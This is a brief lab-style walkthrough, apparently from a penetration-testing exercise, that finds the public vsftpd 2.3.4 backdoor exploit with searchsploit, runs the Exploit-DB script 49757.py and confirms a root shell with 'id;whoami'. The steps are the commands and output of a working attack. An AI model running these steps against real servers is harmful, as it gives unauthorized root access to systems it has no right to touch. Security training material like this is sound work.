`searchsploit vsftpd`
```
vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb
```

`find / -name "49757.py" 2> /dev/null`
```
/usr/share/exploitdb/exploits/unix/remote/49757.py
```
see with `less` what is this script doing

`stat /usr/share/exploitdb/exploits/unix/remote/49757.py`
```
File: /usr/share/exploitdb/exploits/unix/remote/49757.py
  Size: 1101            Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 3298785     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2022-07-12 12:58:59.935883323 -0400
Modify: 2021-11-18 00:02:10.000000000 -0500
Change: 2021-12-20 01:19:03.863582624 -0500
 Birth: 2021-12-20 01:18:58.487582804 -0500
```
it is execatuable

`sudo python3 /usr/share/exploitdb/exploits/unix/remote/49757.py`
```
Success, shell opened
Send `exit` to quit shell
```

`id;whoami`
```
uid=0(root) gid=0(root)
root
```
qed